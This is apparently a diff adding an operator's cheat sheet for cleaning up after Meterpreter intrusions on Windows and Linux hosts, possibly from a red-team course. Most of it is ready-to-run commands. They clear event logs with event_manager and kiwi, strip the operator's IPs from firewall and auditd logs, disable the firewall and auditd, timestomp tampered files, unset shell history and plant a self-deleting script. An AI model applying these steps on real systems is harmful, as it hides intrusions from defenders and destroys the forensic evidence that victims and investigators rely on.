@@ -1,0 +1,529 @@
+
+``` METERPRETER (WINDOWS) CLEANING/ EXIT CHECKS ``` { 
+
+# LOGS / CLEANING / EXIT CHECKS (event logs - (A,S,S), pfirewall.log, Apps, WER, Prefetch, file residue) {
+- no commercial tools for surgically cleaning EVENT logs (fw logs are OK)...
+- either leave incriminating logs... or delete the ENTIRE log 
+
+# .log search, save local file 
+run multicommand -cl 'cmd /c dir c:\*.log /S /A /od /tw' -f /tmp/logsearch
+	- find path with: search -f <filename>
+# .log search - TODAY 
+run multicommand -cl 'cmd /c dir c:\*.log /S /A | findstr "DD/MM/YYYY"'
+ 
+
+# EVENT LOG CLEAR {
+--------------------------------------------------------------------------------------------------------------------------
+SYSTEM 
+7009 - Powershell 
+7045 = "Installation of services" (psexec) 
+SECURITY 
+4624 4634 4672 4776 - Logons
+
+- only wipe when incrimating evidence of log on/log off, exploit activity
+
+# event_manager - wipe out method {
+#1. query entry for exploit log 
+run event_manager -l security -f 529
+
+#2. CLEAR OUT security log (GENERATES another log > beats leaving zeroday evidence)
+run event_manager -c security 
+	#2.5 run event_manager -i 
+		// notice additional log num created in SEC 
+	#2.6 check 'log clear' log - [SEC 517]
+		run event_manager -l security -f 517
+	#CONSIDER 
+		- typically 517 doesn't alert centralized sec info /SIEM. some sec admins create custom alert...
+		- may be best wait for logrotate/ more entries obscure
+}
+
+# psloglist.exe - exact find {
+
+``` upload psloglist.exe and filter event logs``` 
+upload /root/psloglist.exe c:/windows/temp/wsupdt.exe
+cd c:/windows/temp
+run multicommand -cl 'cmd /c wsupdt.exe -m 45 SYSTEM /accepteula' 
+run multicommand -cl 'cmd /c wsupdt.exe -m 45 SECURITY'
+run multicommand -cl 'cmd /c wsupdt.exe -m 45 APPLICATION'
+run multicommand -cl 'cmd /c wsupdt.exe -m 45 "Windows Powershell"'
+# specific event ID filter 
+run multicommand -cl 'cmd /c wsupdt.exe -i 529 -h 1 SECURITY'
+
+
+``` NOTE: Running ANY Sysinternals tool creates a REG KEY. DELETE after use ``` 
+reg enumkey -k "HKU\.Default\Software\Sysinternals" # if SYSTEM 
+reg enumkey -k "HKCU\.Default\Software\Sysinternals"" # if USER 
+*delete 
+
+# on exit 
+reg deletekey -k "HKU\.Default\Software\Sysinternals"
+del c:/windows/temp/wsupdt.exe
+
+
+}
+
+# wevtutil view {  - wevtutil prints in localtime
+# wevtutil - check enabled
+run multicommand -cl 'wevtutil gl SYSTEM'
+run multicommand -cl 'wevtutil gl SECURITY'
+run multicommand -cl 'wevtutil gl APPLICATION'
+
+# review last few entries to see if logged ( last five entries (/c option), sorted newest to oldest (/rd:true) and placing the output into text (/f:text) )
+run multicommand -cl 'wevtutil qe SYSTEM /c:10 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe SECURITY /c:10 /rd:true /f:text' # auditpol removal gets logged
+run multicommand -cl 'wevtutil qe APPLICATION /c:10 /rd:true /f:text'
+		nothing
+		
+# query related SYSTEM/SEC/POWERSHELL IDs 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe SECURITY "/q:*[System [(EventID=4776)]]" /rd:true /f:text'
+run multicommand -cl 'wevtutil qe APPLICATION "/q:*[System [(EventID=1001)]]" /rd:true /f:text' 
+
+
+run multicommand -cl 'wevtutil qe "Windows Powershell" "/q:*[System [(EventID=400)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe "Windows Powershell" "/q:*[System [(EventID=403)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe "Windows Powershell" "/q:*[System [(EventID=600)]]" /rd:true /f:text' 
+
+- 7045 and Powershells == contains exploit == blow away 
+
+
+}
+
+# kiwi_cmd - event cleaning - BEST method (no extra logs) {
+
+``` FUDGE IT BLAST EM ```
+
+load kiwi
+kiwi_cmd "privilege::debug"
+kiwi_cmd "event::drop"
+
+# Clear SECURITY
+kiwi_cmd "event::clear" 
+	# (this will clear the SECURITY log, and is the default setting)
+kiwi_cmd "event::clear /log:System" 
+kiwi_cmd "event::clear /log:Application" 
+# clear powershell 
+run event_manager -c "Windows PowerShell"
+
+# confirm clean 
+run event_manager -i
+
+
+
+
+}
+--------------------------------------------------------------------------------------------------------------------------
+}
+
+# FIREWALL LOG CLEANING {
+--------------------------------------------------------------------------------------------------------------------------
+#1. determine: firewall running? is logging enabled? where logfile located? fw logging policy?
+run multicommand -cl 'netsh advfirewall show currentprofile'
+	pfirewall.log # default 
+ls '%systemroot%\system32\LogFiles\Firewall\pfirewall.log' # GET ORIG. TIME
+cd '%systemroot%\system32\LogFiles\Firewall'
+
+``` if T1 is a REDIRECTOR, search for J2 AND T2 IPs !!! ``` 
+	
+#2. search for matching IP or ports, find discrete string (timestamp or unique IDs) 
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.20" pfirewall.log'
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.20" pfirewall.log'
+	run multicommand -cl 'cmd /c findstr /c:"2022-07-11 10:59" pfirewall.log"	
+#3. write clean copy to c:/windows/temp - (findstr /v > newfile)
+run multicommand -cl 'cmd /c findstr /v /c:"192.168.106.20" pfirewall.log > c:/windows/temp/sd102.tmp'
+	# for multi-strings, create more files 
+	run multicommand -cl 'cmd /c findstr /v /c:"STR2" c:\\windows\\temp\\sd102.tmp > c:/windows/temp/sd103.tmp'
+	run multicommand -cl 'cmd /c findstr /v /c:"STR3" c:\\windows\\temp\\sd103.tmp > c:/windows/temp/sd104.tmp'
+	run multicommand -cl 'cmd /c findstr /v /c:"STR4" c:\\windows\\temp\\sd104.tmp > c:/windows/temp/sd105.tmp'
+	run multicommand -cl 'cmd /c findstr /v /c:"STR5" c:\\windows\\temp\\sd105.tmp > c:/windows/temp/sd106.tmp'
+	run multicommand -cl 'cmd /c findstr /v /c:"STR6" c:\\windows\\temp\\sd106.tmp > c:/windows/temp/sd107.tmp'
+		``` dont forget to clean in c:/windows/temp! ``` 
+		
+#4. confirm string remove 
+cd c:/windows/temp
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.20" c:/windows/temp/sd102.tmp'
+#5. Disable firewall - IOT overwrite pfirewall.log / prevent log gaps. --- (also confirm afk user - idletime / logon.scr)
+run multicommand -cl 'netsh advfirewall set currentprofile state off' 
+
+#6. find time of last log entry 
+	type or cat .log file # if log is SMALL 
+# get LINE-COUNT 
+run multicommand -cl 'cmd /c type sd102.tmp | find /c /v ""'
+# display only last lines of file (starting at line +NUM) 
+run multicommand -cl 'cmd /c more sd102.tmp +1548' 
+	# displays last 2 lines
+
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd102.tmp %systemroot%\system32\LogFiles\Firewall\pfirewall.log'
+
+#8. timestomp
+timestomp -m "08/11/2023 11:11:18" c:/windows/system32/logfiles/firewall/pfirewall.log
+
+#8.5 confirm clean
+run multicommand -cl 'cmd /c findstr  /c:"192.168.106.20" %systemroot%\system32\LogFiles\Firewall\pfirewall.log'
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/pfirewall.log
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+# feedback fw log clean reference {
+Feedback:
+cd c:/windows/temp
+#Validate that this is a good string to use for cleaning: 
+run multicommand -cl 'cmd /c findstr "192.0.2.80" c:\windows\system32\logfiles\firewall\pfirewall.log'
+#If that string is valid, then: 
+run multicommand -cl 'cmd /c findstr /v "192.0.2.80" c:\windows\system32\logfiles\firewall\pfirewall.log > somefile'
+#Verify the string is removed: run multicommand -cl 'findstr "192.0.2.80" somefile' (or if log is small, cat somefile)
+Get line count: run multicommand -cl 'cmd /c type somefile | find /c /v ""' (assuming the line count is 1088)
+View last line of log so you can get the time to set the file to using timestomp: run multicommand -cl 'cmd /c more somefile +1087'
+Run the idletime command to see if the user has been idle for a while.
+Turn off the firewall so you can overwrite the file and timestamp it: run multicommand -cl 'netsh advfirewall set currentprofile state off'
+Overwrite the file: run multicommand -cl 'cmd /c move somefile c:\windows\system32\logfiles\firewall\pfirewall.log'
+Timestamp the file: timestomp -m "MM/DD/YYYY HH:MM:SS" c:\windows\system32\logfiles\firewall\pfirewall.log (using the time of the last log entry)
+Verify the time and file size: ls c:\\windows\\system32\\logfiles\\firewall\\pfirewall.log
+Turn the firewall back on: run multicommand -cl 'netsh advfirewall set currentprofile state on'
+Keep in mind that the IP address you are searching for could show up as older entries from before your operation. If this is the case, leave the older entries in the log.
+Only clean out log entries that are related to your activities for this current operation.
+Note: You can wait until you are ready to disconnect from the host before turning the firewall back on, but we do it here as part of the exercise
+
+}
+
+# UKMK-firewall.log {
+# clean fw log !ALT LOGGING LOC ! {
+run multicommand -cl 'netsh advfirewall show currentprofile'
+	``` %systemroot%\system32\LogFiles\UKMK-firewall.log ``` 
+cd '%systemroot%\system32\LogFiles'
+run multicommand -cl 'cmd /c findstr /c:"172.17.10.78" UKMK-firewall.log'
+
+#3. write clean copy to c:/windows/temp - (findstr /v > newfile)
+run multicommand -cl 'cmd /c findstr /v /c:"172.17.10.78" %systemroot%\system32\LogFiles\UKMK-firewall.log > c:/windows/temp/sd102.tmp'
+#4. confirm string remove 
+cd c:/windows/temp
+run multicommand -cl 'cmd /c findstr /c:"172.17.10.78" c:/windows/temp/sd102.tmp'
+#5. Disable firewall - IOT overwrite %systemroot%\system32\LogFiles\UKMK-firewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+#6. find time of last log entry 
+	type or cat .log file # if log is SMALL 
+# get LINE-COUNT 
+run multicommand -cl 'cmd /c type sd102.tmp | find /c /v ""'
+# display only last lines of file (starting at line +NUM) 
+run multicommand -cl 'cmd /c more sd102.tmp +1548' # displays last 2 lines
+
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd102.tmp %systemroot%\system32\LogFiles\UKMK-firewall.log'
+
+#8. timestomp
+timestomp -m "07/11/2022 11:11:18" %systemroot%\system32\LogFiles\UKMK-firewall.log
+
+#8.5 confirm clean
+run multicommand -cl 'cmd /c findstr  /c:"172.17.10.78" %systemroot%\system32\LogFiles\UKMK-firewall.log'
+
+#8.6 verify time and file size 
+ls  %systemroot%\system32\LogFiles\UKMK-firewall.log
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+
+
+}
+
+
+}
+
+# multi-ip firewall log clean {
+
+
+192.168.4.45 / 192.168.5.11
+
+run multicommand -cl 'cmd /c findstr /c:"192.168.4.45" pfirewall.log'
+run multicommand -cl 'cmd /c findstr /c:"192.168.5.11" pfirewall.log'
+	# !!! IP is sometimes too broad for /v removal (there are older entries with your IP) == search/clean with timestamp
+	run multicommand -cl 'cmd /c findstr /c:"2022-07-11 10:59" pfirewall.log"	
+#3. write clean copy to c:/windows/temp - (findstr /v > newfile)
+run multicommand -cl 'cmd /c findstr /v /c:"192.168.4.45" pfirewall.log > c:/windows/temp/sd102.tmp'
+run multicommand -cl 'cmd /c findstr /v /c:"192.168.5.11" c:\\windows\\temp\\sd102.tmp > c:/windows/temp/sd103.tmp'
+#4. confirm string remove 
+cd c:/windows/temp
+run multicommand -cl 'cmd /c findstr /c:"192.168.4.45" c:/windows/temp/sd103.tmp'
+#5. Disable firewall - IOT overwrite pfirewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+#6. find time of last log entry 
+	type or cat .log file # if log is SMALL 
+# get LINE-COUNT 
+run multicommand -cl 'cmd /c type sd103.tmp | find /c /v ""'
+# display only last lines of file (starting at line +NUM) 
+run multicommand -cl 'cmd /c more sd103.tmp +1548' # displays last 2 lines
+
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd103.tmp c:/windows/system32/logfiles/firewall/pfirewall.log'
+
+#8. timestomp
+timestomp -m "08/02/2023 05:07:38" c:/windows/system32/logfiles/firewall/pfirewall.log
+
+#8.5 confirm clean
+run multicommand -cl 'cmd /c findstr  /c:"192.168.4.45" %systemroot%\system32\LogFiles\Firewall\pfirewall.log'
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/pfirewall.log
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+}
+--------------------------------------------------------------------------------------------------------------------------
+}
+
+# APPLICATION SPECIFIC LOG Considerations / Cleaning {
+--------------------------------------------------------------------------------------------------------------------------
+- starting/stopping apps - to event logs 
+- app specific info usually in pushed to ANOTHER log
+	- e.g. GET/POST IIS requests 
+	- exploit string, time, src IP probably in weblogs
+- Event log issue:
+	- must STOP service to clean original log -> this creates additional entries 
+	- benign service stop/start log > incriminating entry
+- Check for PSP/logging product directories e.g. 
+	MSSEC.EXE 
+		run multicommand -cl 'cmd /c dir "c:\programdata\microsoft\microsoft antimalware\Scans\History\Service\" '
+		run multicommand -cl 'cmd /c type "c:\programdata\microsoft\microsoft antimalware\Scans\History\Service\Detections.log"'
+
+
+- to make files readable once downloaded to nix host 
+dos2unix [file] 
+
+--------------------------------------------------------------------------------------------------------------------------
+}
+
+# WINDOWS ERROR REPORTING (dump files + error logs) {
+- windows XP/2003 systems = Dr. Watson 
+	dump files = .dmp, error logs = .dmp
+- vista and newer systems = C:\ProgramData\Microsoft\Windows\WER\*
+	- dump files = .hdmp/ .mdmp, error logs = .wer 
+
+# system find .wer and dump/log files (search system and search TODAY) 
+search -f *.wer
+run multicommand -cl "cmd.exe /c dir c:\\*.*wer /S /A"
+run multicommand -cl 'cmd /c dir c:\*.wer /S /A | findstr "DD/MM/YYYY"'
+
+run multicommand -cl "cmd.exe /c dir c:\\*.*dmp /S /A"
+run multicommand -cl 'cmd /c dir c:\*dump /S /A | findstr "DD/MM/YYYY"'
+
+
+	e.g. cd c:/docume~1/alluse~1/applic~1/micros~1/drwats~1
+# DECISION: to clean or not to clean? rule of thumb-
+	- remove dump + error log files IF times are within timeframe of connected to remote tgt 
+	- download/review related dumps for HEALTH AND WELLNESS CHECK
+
+
+}
+
+# PREFETCH (not on Windows Servers) {
+- native host commands or host shell, probably created prefetch pointers 
+
+# view prefetch by date/write time
+cd c:/windows/prefetch 
+ls -t
+	run multicommand -cl "cmd.exe /c dir /A /o:d /t:w"
+	 
+
+}
+
+# FILE RESIDUE + HANGING PROCS + ARTIFACTS (powershell) {
+cd c:/windows/temp
+	- delete uploaded files before closing session
+ls -t
+	- kill started procs 
+ps
+	
+# powershell artifacts {
+cd c:/windows/temp  // OR TRANSCIPT REG KEY LOCATION == USER DOCS 
+dir 
+cd 20230724
+
+# download all (non-0) and review 
+download X
+
+# delete files containing exploit 
+del X 
+
+# close file handle 
+--- one file is OPENED by process. CLOSE IT 
+run multicommand -cl 'handle.exe -p 2716 -a /accepteula'
+run multicommand -cl 'handle.exe -c 6D8 -p 2716 -y'
+	NOW can delete
+
+
+}
+
+# IF used handle.exe or ANY sysinternal 
+reg enumkey -k "HKU\.Default\Software\Sysinternals"
+reg deletekey -k "HKU\.Default\Software\Sysinternals"
+
+}
+
+}
+
+# EXIT CHECK REVIEW {
+1. Cleaned logs 
+	-event logs?
+	-fw logs?
+	-app logs? (do log search) 
+	-WER logs? 
+		(if XP, check dir c:\Documents and Settings\All Users\Application for Dr. Watson)
+	-prefetch?
+6. residue files (c:\windows\temp) || hanging procs (finstr, cmd, .e.g)
+7. cleaned exploit/tool artifacts? e.g. powershell_transcript in c:/windows/temp
+8. restored firewall and auditpol?
+
+removed any added registry keys? (e.g. Sysinternals key from psloggedon.exe / any sysinternal tool)
+
+}
+
+}
+
+``` NIX CLEANING/ EXIT CHECKS``` {
+- clean with standard UNIX commands (unless binary like w/u/btmp)
+- not locked by parent process
+- requires ROOT 
+
+NOTE: if rotated log (log.1, log.2 etc) - timestomp to ROTATED date. Not last entry! touch -r <other.log>
+
+# FINDS {
+# locate ALL new/modified files. Note extra device logs.
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -290 -type f -print0 | xargs -0 ls -latr 
+find /var/log -type f -mmin -10 2> /dev/null # just /var/log 
+tail -n30 <log>
+}
+
+# FLAT TEXT LOG CLEAN {
+
+# find logs 
+egrep -r "<>" /var/log
+	#<IP>|<PID>|<ACCESS-PORT>|<TIMESTAMP>
+
+``` to clean binary files, may need -a grep option! ``` 
+
+#1. check presence - may need to clean harder than IP
+egrep "<IP>|<PID>|<ACCESS-PORT>|<TIMESTAMP>" <file>
+#2. create clean 
+egrep -v "sshd\[1369\]" /var/log/secure > /tmp/secure.clean
+#3. confirm removed 
+egrep "<IP>|<PID>|<ACCESS-PORT>|<TIMESTAMP>" <file>
+tail -n30 <file>
+#4. overwite file 
+cat /tmp/secure.clean > /var/log/secure
+#5. timestomp 
+touch -r <ref> <file> # last files in dir 
+touch -t YYYYMMDDHHMM.SS
+#6. clean files 
+rm -rf /tmp/secure.clean
+
+
+# ^ SCRIPT ^ {
+
+
+
+
+}
+
+}
+
+# .history {
+
+# ON LOGIN
+unset HISTFILE
+# if must clean after write... 
+cp /dev/null > history
+wc/tail to clean specific entries 
+}
+
+# AUDITD {
+
+# check {
+service auditd status 
+
+# stop auditd 
+ls -latr /var/log/audit/audit.log
+tail -n10 /var/log/audit/audit.log
+date -d "@<epoch>" # save time of last entry
+
+service auditd stop
+	# created entry with time Fri Jul 21 20:15:06. same as modified timestamp 
+
+
+}
+
+# clean {
+- check for your login METHOD and login general 
+	exe="/usr/sbin/sshd"
+	exe=/bin/login - ocurring around same time 
+
+# search 1
+egrep "exe=\"/usr/sbin/sshd\"" /var/log/audit/audit.log
+	egrep "192.0.2.80" /var/log/audit/audit.log 
+egrep "exe=\"/bin/login\"" /var/log/audit/audit.log
+
+# search 2 
+ausearch -i | grep "07/21/2023" 
+ausearch -i | grep "192.0.2.80" 
+
+# confirm  
+egrep -v "192.0.2.80" /var/log/audit/audit.log > /tmp/a.clean
+egrep "192.0.2.80" /tmp/a.clean 
+# Clean
+cat /tmp/a.clean > /var/log/audit/audit.log
+
+# delete 
+rm /tmp/a.clean 
+
+# stomp 
+date -d "@lastentry"
+touch -t 202307212015.06 /var/log/audit/audit.log
+}
+
+# audit  reenable script { - start editing after disconnect and self delete 
+cd /tmp 
+
+echo -e '#!/bin/sh\nsleep 20\nfunction d {\nservice auditd start; rm -rf /tmp/X-unix\n}\ntrap d EXIT' > X-unix
+chmod 755 X-unix
+cat X-unix
+./X-unix&
+exit 
+	(exit off Target 1, 20 seconds!)
+
+
+
+
+} 
+
+}
+
+# MISC {
+
+# journald cleaning - only takes effect ones systemd restarts
+journalctl --vacuum-time=
+	journalctl --vacuum-time=2h # cleans all but last 2h of logs
+
+}
+
+# /tmp 
+- clear copies
+
+}
+
+
